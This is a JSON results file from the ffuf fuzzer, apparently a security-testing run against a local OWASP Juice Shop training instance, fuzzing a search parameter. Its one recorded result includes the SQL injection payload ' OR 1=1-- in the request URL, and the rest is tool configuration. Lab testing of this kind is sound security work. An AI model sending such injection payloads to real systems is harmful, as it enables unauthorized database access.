{"commandline":"ffuf -w /Users/raphaelpang/code/elise/payloads/temp/a07b9d1b-dd73-4956-a2b2-a635cad7c05a.txt -t 25 -mc 200,302,400,401,403,404,500 -timeout 30 -ac -json -o /Users/raphaelpang/code/elise/data/results/ffuf/ffuf_1755762736392.json -u http://localhost:8082/juice-shop/juice-shop/search?l=javascript\u0026l=FUZZ","time":"2025-08-21T15:52:16+08:00","results":[{"input":{"FFUFHASH":"18c641","FUZZ":"adminccDXvNoK"},"position":1,"status":400,"length":0,"words":1,"lines":1,"content-type":"","redirectlocation":"","scraper":{},"duration":821625,"resultfile":"","url":"http://localhost:8082/juice-shop/juice-shop/search?l=javascript\u0026l=' OR 1=1--","host":"localhost:8082"}],"config":{"autocalibration":true,"autocalibration_keyword":"FUZZ","autocalibration_perhost":false,"autocalibration_strategies":["basic"],"autocalibration_strings":[],"colors":false,"cmdline":"ffuf -w /Users/raphaelpang/code/elise/payloads/temp/a07b9d1b-dd73-4956-a2b2-a635cad7c05a.txt -t 25 -mc 200,302,400,401,403,404,500 -timeout 30 -ac -json -o /Users/raphaelpang/code/elise/data/results/ffuf/ffuf_1755762736392.json -u http://localhost:8082/juice-shop/juice-shop/search?l=javascript\u0026l=FUZZ","configfile":"","postdata":"","debuglog":"","delay":{"value":"0.00"},"dirsearch_compatibility":false,"encoders":[],"extensions":[],"fmode":"or","follow_redirects":false,"headers":{},"ignorebody":false,"ignore_wordlist_comments":false,"inputmode":"clusterbomb","cmd_inputnum":100,"inputproviders":[{"name":"wordlist","keyword":"FUZZ","value":"/Users/raphaelpang/code/elise/payloads/temp/a07b9d1b-dd73-4956-a2b2-a635cad7c05a.txt","encoders":"","template":""}],"inputshell":"","json":true,"matchers":{"IsCalibrated":true,"Mutex":{},"Matchers":{"status":{"value":"200,302,400,401,403,404,500"}},"Filters":{"size":{"value":"80117"}},"PerDomainFilters":{}},"mmode":"or","maxtime":0,"maxtime_job":0,"method":"GET","noninteractive":false,"outputdirectory":"","outputfile":"/Users/raphaelpang/code/elise/data/results/ffuf/ffuf_1755762736392.json","outputformat":"json","OutputSkipEmptyFile":false,"proxyurl":"","quiet":false,"rate":0,"raw":false,"recursion":false,"recursion_depth":0,"recursion_strategy":"default","replayproxyurl":"","requestfile":"","requestproto":"https","scraperfile":"","scrapers":"all","sni":"","stop_403":false,"stop_all":false,"stop_errors":false,"threads":25,"timeout":30,"url":"http://localhost:8082/juice-shop/juice-shop/search?l=javascript\u0026l=FUZZ","verbose":false,"wordlists":["/Users/raphaelpang/code/elise/payloads/temp/a07b9d1b-dd73-4956-a2b2-a635cad7c05a.txt"],"http2":false,"client-cert":"","client-key":""}}